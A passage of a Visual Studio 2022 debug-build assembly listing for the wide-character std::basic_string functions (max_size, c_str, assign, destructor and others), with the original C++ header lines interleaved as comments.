	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0010c	5f		 pop	 rdi
  0010d	5d		 pop	 rbp
  0010e	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
_Alloc_max$ = 8
_Storage_max$ = 40
$T4 = 264
$T5 = 296
$T6 = 328
__$ArrayPad$ = 344
this$ = 384
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT

; 4165 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 01
	00 00		 sub	 rsp, 392		; 00000188H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 2a 00 00 00	 mov	 ecx, 42			; 0000002aH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+424]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 58 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4166 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

  00049	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00050	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00055	48 8b c8	 mov	 rcx, rax
  00058	e8 00 00 00 00	 call	 ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
  0005d	48 89 45 08	 mov	 QWORD PTR _Alloc_max$[rbp], rax

; 4167 :         const size_type _Storage_max = // can always store small string

  00061	48 c7 85 08 01
	00 00 08 00 00
	00		 mov	 QWORD PTR $T4[rbp], 8
  0006c	48 8d 95 08 01
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  00073	48 8d 4d 08	 lea	 rcx, QWORD PTR _Alloc_max$[rbp]
  00077	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  0007c	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0007f	48 89 45 28	 mov	 QWORD PTR _Storage_max$[rbp], rax

; 4168 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4169 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

  00083	48 8b 45 28	 mov	 rax, QWORD PTR _Storage_max$[rbp]
  00087	48 ff c8	 dec	 rax
  0008a	48 89 85 28 01
	00 00		 mov	 QWORD PTR $T5[rbp], rax
  00091	e8 00 00 00 00	 call	 ?max@?$numeric_limits@_J@std@@SA_JXZ ; std::numeric_limits<__int64>::max
  00096	48 89 85 48 01
	00 00		 mov	 QWORD PTR $T6[rbp], rax
  0009d	48 8d 95 28 01
	00 00		 lea	 rdx, QWORD PTR $T5[rbp]
  000a4	48 8d 8d 48 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  000ab	e8 00 00 00 00	 call	 ??$min@_K@std@@YAAEB_KAEB_K0@Z ; std::min<unsigned __int64>
  000b0	48 8b 00	 mov	 rax, QWORD PTR [rax]

; 4170 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4171 :         );
; 4172 :     }

  000b3	48 8b f8	 mov	 rdi, rax
  000b6	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000ba	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData
  000c1	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000c6	48 8b c7	 mov	 rax, rdi
  000c9	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000d0	48 33 cd	 xor	 rcx, rbp
  000d3	e8 00 00 00 00	 call	 __security_check_cookie
  000d8	48 8d a5 68 01
	00 00		 lea	 rsp, QWORD PTR [rbp+360]
  000df	5f		 pop	 rdi
  000e0	5d		 pop	 rbp
  000e1	c3		 ret	 0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
this$ = 224
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str, COMDAT

; 4143 :     _NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* c_str() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4144 :         return _Mypair._Myval2._Myptr();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr

; 4145 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
_TEXT	SEGMENT
this$ = 224
_Ptr$ = 232
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT

; 3431 :     _CONSTEXPR20 basic_string& assign(_In_z_ const _Elem* const _Ptr) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3432 :         return assign(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

  00024	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  0002b	e8 00 00 00 00	 call	 ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ; std::_WChar_traits<wchar_t>::length
  00030	48 8b c8	 mov	 rcx, rax
  00033	e8 00 00 00 00	 call	 ??$_Convert_size@_K_K@std@@YA_K_K@Z ; std::_Convert_size<unsigned __int64,unsigned __int64>
  00038	4c 8b c0	 mov	 r8, rax
  0003b	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00042	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign

; 3433 :     }

  0004e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00055	5f		 pop	 rdi
  00056	5d		 pop	 rbp
  00057	c3		 ret	 0
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
_TEXT	SEGMENT
_Old_ptr$1 = 8
$T2 = 228
$T3 = 260
this$ = 320
_Ptr$ = 328
_Count$ = 336
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT

; 3410 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN4:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3411 :         // assign [_Ptr, _Ptr + _Count)
; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  00029	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  00034	48 39 85 50 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  0003b	77 6c		 ja	 SHORT $LN2@assign

; 3413 :             _ASAN_STRING_REMOVE(*this);
; 3414 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  0003d	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b c8	 mov	 rcx, rax
  00047	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  0004c	48 89 45 08	 mov	 QWORD PTR _Old_ptr$1[rbp], rax

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00050	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00057	48 8b 8d 50 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0005e	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 3416 :             _Traits::move(_Old_ptr, _Ptr, _Count);

  00062	4c 8b 85 50 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00069	48 8b 95 48 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00070	48 8b 4d 08	 mov	 rcx, QWORD PTR _Old_ptr$1[rbp]
  00074	e8 00 00 00 00	 call	 ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00079	33 c0		 xor	 eax, eax
  0007b	66 89 85 e4 00
	00 00		 mov	 WORD PTR $T2[rbp], ax
  00082	48 8b 45 08	 mov	 rax, QWORD PTR _Old_ptr$1[rbp]
  00086	48 8b 8d 50 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0008d	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00091	48 8d 95 e4 00
	00 00		 lea	 rdx, QWORD PTR $T2[rbp]
  00098	48 8b c8	 mov	 rcx, rax
  0009b	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  000a0	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000a7	eb 35		 jmp	 SHORT $LN1@assign
$LN2@assign:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  000a9	48 8d 85 04 01
	00 00		 lea	 rax, QWORD PTR $T3[rbp]
  000b0	48 8b f8	 mov	 rdi, rax
  000b3	33 c0		 xor	 eax, eax
  000b5	b9 01 00 00 00	 mov	 ecx, 1
  000ba	f3 aa		 rep stosb
  000bc	4c 8b 8d 48 01
	00 00		 mov	 r9, QWORD PTR _Ptr$[rbp]
  000c3	44 0f b6 85 04
	01 00 00	 movzx	 r8d, BYTE PTR $T3[rbp]
  000cb	48 8b 95 50 01
	00 00		 mov	 rdx, QWORD PTR _Count$[rbp]
  000d2	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d9	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN1@assign:

; 3423 :             _Count,
; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {
; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);
; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());
; 3427 :             },
; 3428 :             _Ptr);
; 3429 :     }

  000de	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  000e5	5f		 pop	 rdi
  000e6	5d		 pop	 rbp
  000e7	c3		 ret	 0
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
_TEXT	SEGMENT
this$ = 224
_Ptr$ = 232
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT

; 3239 :     _CONSTEXPR20 basic_string& operator=(_In_z_ const _Elem* const _Ptr) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3240 :         return assign(_Ptr);

  00024	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  0002b	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00032	e8 00 00 00 00	 call	 ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign

; 3241 :     }

  00037	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003e	5f		 pop	 rdi
  0003f	5d		 pop	 rbp
  00040	c3		 ret	 0
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 3176 :     _CONSTEXPR20 ~basic_string() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3177 :         _Tidy_deallocate();

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate

; 3178 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3179 :         auto&& _Alproxy          = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 3180 :         const auto _To_delete    = _Mypair._Myval2._Myproxy;
; 3181 :         _Mypair._Myval2._Myproxy = nullptr;
; 3182 :         _Delete_plain_internal(_Alproxy, _To_delete);
; 3183 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3184 :     }

  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8b c8	 mov	 rcx, rax
  00035	e8 00 00 00 00	 call	 ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
_My_data$ = 8
$T1 = 228
this$ = 288
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty, COMDAT

; 2643 :     _CONSTEXPR20 void _Construct_empty() {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2644 :         auto& _My_data = _Mypair._Myval2;

  0001f	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2645 :         _My_data._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

  0002a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  00031	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00035	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2646 : 
; 2647 :         // initialize basic_string data members
; 2648 :         _My_data._Mysize = 0;

  0003a	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0003e	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00046	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0004a	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();

  00052	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00056	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0005b	33 c0		 xor	 eax, eax
  0005d	66 89 85 e4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00064	b8 02 00 00 00	 mov	 eax, 2
  00069	48 6b c0 00	 imul	 rax, rax, 0
  0006d	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00071	48 03 c8	 add	 rcx, rax
  00074	48 8b c1	 mov	 rax, rcx
  00077	48 8d 95 e4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0007e	48 8b c8	 mov	 rcx, rax
  00081	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2654 :     }

  00086	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0008d	5f		 pop	 rdi
  0008e	5d		 pop	 rbp
  0008f	c3		 ret	 0
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Old_ptr$ = 232
_Capacity$ = 240
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity, COMDAT

; 2638 :         _Alty& _Al, const pointer _Old_ptr, const size_type _Capacity) noexcept {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2639 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2640 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00030	48 ff c0	 inc	 rax
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Old_ptr$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00044	e8 00 00 00 00	 call	 ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ; std::allocator<wchar_t>::deallocate

; 2641 :     }

  00049	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00050	5f		 pop	 rdi
  00051	5d		 pop	 rbp
  00052	c3		 ret	 0
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
$T1 = 196
$T2 = 228
this$ = 288
_Right$ = 296
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2508 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0002b	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
